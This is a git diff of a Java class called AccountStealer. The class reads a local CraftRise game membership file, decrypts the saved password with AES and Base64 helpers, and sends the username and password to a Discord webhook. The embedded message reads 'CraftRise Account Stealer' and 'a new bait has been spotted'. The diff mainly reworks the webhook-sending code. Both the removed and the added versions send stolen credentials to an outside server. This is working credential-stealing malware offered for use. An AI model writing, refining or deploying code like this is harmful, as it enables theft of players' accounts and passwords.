@@ -3,13 +3,12 @@ package io.github.itzgonza.impl;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.function.Function;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
+import javax.net.ssl.HttpsURLConnection;
 import javax.xml.bind.DatatypeConverter;
 
 import org.apache.commons.codec.binary.Base64;
@@ -22,7 +21,7 @@ import com.google.gson.JsonParser;
  */
 public class AccountStealer {
 	
-	public transient static AccountStealer instance;
+    public transient static AccountStealer instance;
 
     private String username, password, webhookURL, membershipPath;
 
@@ -35,6 +34,7 @@ public class AccountStealer {
 
     public void initialize() throws Exception {
         File membershipFile = new File(membershipPath);
+        
         if (!membershipFile.exists()) {
             System.err.println("Membership file not found.");
             return;
@@ -55,22 +55,18 @@ public class AccountStealer {
             setPassword(Decryptor.AES_ECB_PKCS5.decrypt(encryptedPassword));
         }
         
-        synchronized ("Webhook Sender") {
-            URL url = new URL(webhookURL);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Content-Type", "application/json");
-            connection.setRequestProperty("User-Agent", "itzgonza1337.cu");
-            connection.setDoOutput(true);
-
-            String jsonInputString = String.format("{\"username\": \"@gonz9\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/711840664832442389/eae10664e7dedda0647a62a3e8b5e408.png?size=2048\", \"content\": \"\", \"embeds\": [{\"title\": \"CraftRise Account Stealer :dash:\", \"color\":df9252, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_blue_diamond:Username **%s**\\n:small_blue_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/itzgonza\", \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\"}, \"fields\": []}], \"components\": []}", getUsername(), getPassword(), getUsername());
-
-            try (OutputStream os = connection.getOutputStream()) {
-                byte[] input = jsonInputString.getBytes();
-                os.write(input, 0, input.length);
-            }
-            
-        }
+	synchronized ("Webhook Sender") {
+		HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
+		connection.addRequestProperty("Content-Type", "application/json");
+		connection.addRequestProperty("User-Agent", "itzgonza1337.cu");
+		connection.setRequestMethod("POST");
+		connection.setDoOutput(true);
+	    	
+		connection.getOutputStream().write(String.format("{\"username\": \"gonz9\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\", \"content\": \"\", \"embeds\": [{\"title\": \"CraftRise Account Stealer :dash:\", \"color\":11298903, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_orange_diamond:Username **%s**\\n:small_orange_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/itzgonza\", \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\"}, \"fields\": []}], \"components\": []}", getUsername(), getPassword(), getUsername()).getBytes());
+	    	
+		connection.getOutputStream().close();
+		connection.getInputStream().close();
+	};
     }
 
     private String getUsername() {
@@ -141,8 +137,8 @@ public class AccountStealer {
 
         private static String decryptBase64(String input)  {
             try {
-				return new String(Base64.decodeBase64(input), "utf-8");
-			} catch (Exception ignored) {return null;}
+		return new String(Base64.decodeBase64(input), "utf-8");
+	    } catch (Exception ignored) {return null;}
         }
 
         public abstract String decrypt(String encryptedPassword);
